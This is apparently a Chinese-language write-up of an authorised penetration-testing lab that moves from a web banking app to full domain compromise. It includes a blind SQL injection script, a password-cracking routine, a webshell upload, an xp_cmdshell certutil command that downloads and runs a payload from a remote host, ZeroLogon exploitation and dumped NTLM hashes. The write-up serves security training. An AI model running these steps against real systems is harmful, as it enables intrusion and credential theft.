环境搭建 
1.项目介绍： 
本次项目模拟渗透测试人员在授权的情况下，对目标进行渗透测试，从外网打
点到内网横向渗透，最终获取整个内网权限。本次项目属于三层代理内网穿
透，会学习到各种内网穿透技术，cobalt strike 在内网中各种横行方法，也
会学习到在工具利用失败的情况下，手写 exp 获取边界突破点进入内网，详细
介绍外网各种打点方法,学习到行业流行的内网渗透测试办法，对个人提升很有
帮助。 
2.VPS 映射 
1.将 ip 映射到公网。在公网 vps 使用配置 frp 工具的 frps.ini 运行 frps.exe 
-c frps.ini 
在 web1 上配置 frpc.ini 运行 frpc.exe -c frp.ini 
成功访问到环境 
http://x.x.x.x:8088/login.jsp 
信息收集 
1.端口探测 
使用 nmap 进行端口探测，发现 4444、5003、8088、8899、8878 端口开放。 
然后查看其详细信息。 
2.网站源代码查找 
发现有一个网上银行系统。使用弱口令和暴力破解，没有爆破出弱口令用户。 
然后就在 github 试试运气，发现了源码。 
源码地址：https://github.com/amateur-RD/netBank-System 
发现了一个数据库文件，有一些普通用户和管理员用户的账户和密码。 
3.SQL 注入 
然后进行登录测试，发现存在 sql 注入漏洞 
网上银行系统 Hsql 注入漏洞 
使用 sqlmap 不能进行跑出用户名和密码。 
4.编写脚本进行 sql 注入 
#coding:utf-8 
import requests 
password="" 
url="http://x.x.x.x:8878/admin/login" 
payload="0123456789abcdefghijklmnopqrstuvwxyz" 
password="" 
for i in range(1,20): 
 for j in payload: 
   exp = "admin' and(select substring(password,%s,1) from Admin) 
like '%s' 
or '1'='" %(i,j) 
   print("正在注入") 
   data = {"admin.username": exp, "admin.password": 'aaaa', 
"type": 1} 
   req = requests.post(url=url, data=data); 
   if "密码不正确" in req.text: 
     password+=j 
     break 
print(password) 
成功跑出密码。然后进行登录。 
登录之后，寻找文件上传或者可以获取到 webshell 的地方，发现没有可利用
点。
5.tomexam SQL 注入漏洞 
在另一个地址处，发现可以注册用户。然后注册用户进行登录。 
登录之后发现，某处存在 sql 注入。 
使用 sqlmap 进行获取用户信息。 
| 1  | 1      | 1399999999 | 1      | 超级管理员 | 
admin    | admin    | 17D03DA6474CE8BEB13B01E79F789E63       | 
2022-04-09 00:14:08 | 301        | 
| 6  | 2      |     | 1      |     | eu3      | 
eu3      | 4124DDEBABDF97C2430274823B3184D4 (eu3) | 2014-05-17 
13:58:49 | 14 
成功抓到了管理员用户和密码，然后使用 md5 进行解密。 
成功进行登录。登录之后没有找到可 getshell 的地方。 
6.Jspxcms-SQL 注入 
首页发现可以注册用户和进行登录。首先搜索历史漏洞，看看有没有 getshell
的地方。 
发现先知的大佬做过找个版本的代码审计。参考链接：
https://xz.aliyun.com/t/10891?page=1#toc-7。发现可以通过文件上传进行
gethshell。 
在之前的 tomexam 的数据库中，发现存在 jspxcms，试试查找一下管理员的用
户和信息。 
使用 sqlmap 进行查找表、用户和吗密码。 
成功发现了用户名和加密的密码。密码推断是明文密码+salt 然后再进行 md5
加密。 
7.编写解密脚本 
通过其源码，分析其加密方式，然后编写解密脚本。 
package com.jspxcms.core; 
import com.jspxcms.common.security.SHA1CredentialsDigest; 
import com.jspxcms.common.util.Encodes; 
import java.io.File; 
import java.io.FileReader; 
import java.io.FileWriter; 
import java.io.PrintWriter; 
import java.util.Scanner; 
public class Testmain { 
  public static void main(String[] args)throws Exception { 
    byte[] salt = Encodes.decodeHex("9b2b38ad7cb62fd9"); 
    SHA1CredentialsDigest test = new SHA1CredentialsDigest(); 
    String fileName = "D:\\csdnpass.txt"; 
    String fileName2 = "D:\\hashpassword2.txt"; 
    try (Scanner sc = new Scanner(new FileReader(fileName))) { 
      while (sc.hasNextLine()) { 
        String line = sc.nextLine(); 
        String encPass = test.digest(line, salt); 
        File f = new File(fileName2); 
        FileWriter fw = new FileWriter(f, true); 
        PrintWriter pw = new PrintWriter(fw); 
        pw.println(line + " " + encPass); 
        pw.close(); 
     } 
   } 
 } 
} 
8.登录 jspxcms 后台 getshell 
使用管理员用户和解密出来的密码，成功进入管理员后台。 
8.使用哥斯拉生成一个木马，然后使用 jar，打包成为 war 包。 
9.编写目录穿越脚本 
根据先知社区的大佬提出的方法，编写目录穿越脚本。 
成功进行上传。 
10.获取 webshell 
使用哥斯拉连接 webshell,成功执行命令。 
内网渗透： 
1.frp 反向代理上线 CS 
首先配置内网 cobalt strike 内网上线 
在 kali 启动 cs 服务端， 
查看其端口 
配置 frp 的 frps.ini 信息。 
2.CS 上线 
cs 生成监听。 
然后上传.exe 文件进行上线。 
成功上线。 
3.内网信息收集 
使用 shell iponfig 收集信息。 
根据搭建的拓扑环境，然后测试一下与其他域内主机的连通性。 
查看计算机名。 
使用 net view 查找域内其它主机，发现不能找到其他主机。 
4.开启代理进行端口扫描 
查看 server2012 的 IP 地址。 
5.域内主机端口扫描 
发现存在 1433——Mysql 的端口，尝试进行弱口令的暴力破解。 
最好成功爆破出账号和密码. 
6.mssqlclient 登录 MYsql 服务器 
使用 mysql 用户和密码进行登录。 
7.xp_cmshell 进行 getshell 
help 查看可以执行那些命令。 
开启 xp_cmdshell，然后进行信息收集。 
使用 certutil 远程下载之前的木马，然后进行上线 
xp_cmdshell certutil -urlcache -split -f http://x.x.x.x/artifact.exe 
c:/windows/temp/artifact.exe 
8.使用 SweetPotato (ms16-075)提权 
上线之后，进行简单的信息收集。 
然后使用第三方插件，利用 SweetPotato (ms16-075)提权对其进行提权。 
成功提权。 
内网域渗透 
1.内网域信息收集 
使用 net view 查看域内主机。 
使用 hashdump 进行抓取一些用户的 hash 值。 
查看主机 ip 地址。 
查看域控的 Ip 地址，和域控的计算机名。 
2.ZeroLogon CVE-2020-1472 获取域控权限 
编译 zerolgin 的脚本成为 exe，然后进行测试，发现主机存在该漏洞。 
将它设置为空密码。31d6cfe0d16ae931b73c59d7e0c089c0 
3.配置代理，登录域控 
配置 kali 的代理地址，然后进行端口扫描，测试代理是否连接。 
获取域控的 hash 值。 
2
Administrator:500:aad3b435b51404eeaad3b435b51404ee:81220c729f6ccb63d7
82a77007550f74::: 
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0
c089c0::: 
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b20eb34f01eaa5ac8b6f80986
c765d6d::: 
sec123.cnk\cnk:1108:aad3b435b51404eeaad3b435b51404ee:83717c6c40593740
6f8e0a02a7215b16::: 
AD01$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e
0c089c0::: 
SERVER2012$:1109:aad3b435b51404eeaad3b435b51404ee:cc759f89477f1595c99
3831ce5944e95::: 
然后进行登录域控。 
4.PTH 上线 CS 
关闭防火墙，利用 pth 进行上线 cs。 
成功执行命令。 
生成 tcp 监听，然后 jump 到域控主机。 
5.恢复密码、原 hash。 
恢复密码。 
使用 secretsdump.py 获取其 hash 值。 
python3 secretsdump.py -sam sam.save -system system.save -security 
security.save LOCA 
使用：proxychains4 python3 reinstall_original_pw.py ad01 10.10.10.139 
fb61e3c372e666adccb7a820aa39772f 恢复域控密码。成功恢复其密码。 
靶机到这里就结束了。 
最后，成功拿下整个域控。 
总结： 
该项目从环境搭建，使用 vps 将 web1 主机映射到公网上。通过信息收集，搜索
源码，然后分析源码，进行 sql 注入。编写 sql 注入脚本进行注入，通过分析
登录端的源码编写加密脚本，在编写目录穿越脚本成功获取 webshell。在内网
渗透中，使用 frp 反向代理上线 cs，使用 xp_cmdshell 进行 getshell。在域渗
透中使用 CVE-2020-1472 获取域控权限。这台靶机中没装杀软，但是从外网打
点到内网渗透，再到域渗透中的知识面是非常广的。